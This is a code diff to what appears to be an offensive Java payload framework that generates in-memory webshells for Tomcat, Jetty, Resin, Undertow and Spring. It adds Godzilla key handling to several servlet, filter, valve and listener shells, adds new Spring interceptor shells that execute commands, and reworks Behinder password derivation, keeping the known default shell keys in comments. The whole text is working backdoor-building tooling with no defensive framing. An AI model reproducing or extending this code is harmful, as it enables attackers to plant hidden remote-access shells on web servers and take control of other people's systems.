@@ -1,10 +1,12 @@
 package com.ppp.middleware.builder;
 
 import com.ppp.JavaClassHelper;
+import com.ppp.Printer;
 import com.ppp.annotation.Builder;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.MemShellFunction;
 import com.ppp.annotation.Middleware;
+import com.ppp.utils.maker.CryptoUtils;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
@@ -62,7 +64,7 @@ public class MSJavaClassBuilder {
         // response
         tomcatListenerResponseMaker(ctClass);
 
-
+        godzillaMS(javaClassHelper);
         JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
 
         return JavaClassModifier.toBytes(ctClass);
@@ -119,6 +121,7 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Servlet)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] tomcatServletGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        godzillaMS(javaClassHelper);
         return defaultOriginalMS(cls, javaClassHelper);
     }
 
@@ -148,6 +151,7 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Filter)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] tomcatFilterGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        godzillaMS(javaClassHelper);
         return defaultOriginalMS(cls, javaClassHelper);
     }
 
@@ -184,6 +188,7 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Valve)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] tomcatValveGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        godzillaMS(javaClassHelper);
         return defaultOriginalMS(cls, javaClassHelper);
     }
 
@@ -209,6 +214,21 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Controller)
     @MemShellFunction(MemShellFunction.Exec)
     public byte[] springControllerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Spring)
+    @MemShell(MemShell.Interceptor)
+    @MemShellFunction(MemShellFunction.Exec)
+    public byte[] springInterceptorExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Spring)
+    @MemShell(MemShell.Interceptor)
+    @MemShellFunction(MemShellFunction.Godzilla)
+    public byte[] springInterceptorGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        godzillaMS(javaClassHelper);
         return defaultOriginalMS(cls, javaClassHelper);
     }
 
@@ -239,6 +259,7 @@ public class MSJavaClassBuilder {
         // response
         jettyListenerResponseMaker(ctClass);
 
+        godzillaMS(javaClassHelper);
         JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
 
         return JavaClassModifier.toBytes(ctClass);
@@ -307,6 +328,7 @@ public class MSJavaClassBuilder {
         // response
         resinListenerResponseMaker(ctClass);
 
+        godzillaMS(javaClassHelper);
         JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
 
         return JavaClassModifier.toBytes(ctClass);
@@ -359,6 +381,7 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Servlet)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] resinServletGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        godzillaMS(javaClassHelper);
         return defaultOriginalMS(cls, javaClassHelper);
     }
 
@@ -388,6 +411,7 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Filter)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] resinFilterGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        godzillaMS(javaClassHelper);
         return defaultOriginalMS(cls, javaClassHelper);
     }
 
@@ -420,6 +444,7 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Servlet)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] undertowServletGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        godzillaMS(javaClassHelper);
         return defaultOriginalMS(cls, javaClassHelper);
     }
 
@@ -461,6 +486,7 @@ public class MSJavaClassBuilder {
         // response
         undertowListenerResponseMaker(ctClass);
 
+        godzillaMS(javaClassHelper);
         JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
 
         return JavaClassModifier.toBytes(ctClass);
@@ -528,6 +554,7 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Filter)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] undertowFilterGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        godzillaMS(javaClassHelper);
         return defaultOriginalMS(cls, javaClassHelper);
     }
 
@@ -546,12 +573,25 @@ public class MSJavaClassBuilder {
         return defaultOriginalMS(cls, javaClassHelper);
     }
 
+    public static void godzillaMS(JavaClassHelper javaClassHelper) throws Exception {
+        String pass = javaClassHelper.getPass();
+        String key = javaClassHelper.getKey();
+
+        Printer.yellowInfo(String.format("pass: %s", pass));
+        Printer.yellowInfo(String.format("key: %s", key));
+//        javaClassHelper.setPass("3c6e0b8a9c15224a");
+        javaClassHelper.setKey(CryptoUtils.md5Half(key));
+//        javaClassHelper.setPass(pass);
+    }
 
     /**
      * 冰蝎 密码
      */
     public static void behinderMS(JavaClassHelper javaClassHelper) throws Exception {
-        javaClassHelper.setPass("e45e329feb5d925b");
+        String pass = javaClassHelper.getPass();
+        Printer.yellowInfo(String.format("pass: %s", pass));
+//        javaClassHelper.setPass("e45e329feb5d925b");
+        javaClassHelper.setPass(CryptoUtils.md5Half(pass));
     }
 
     /**
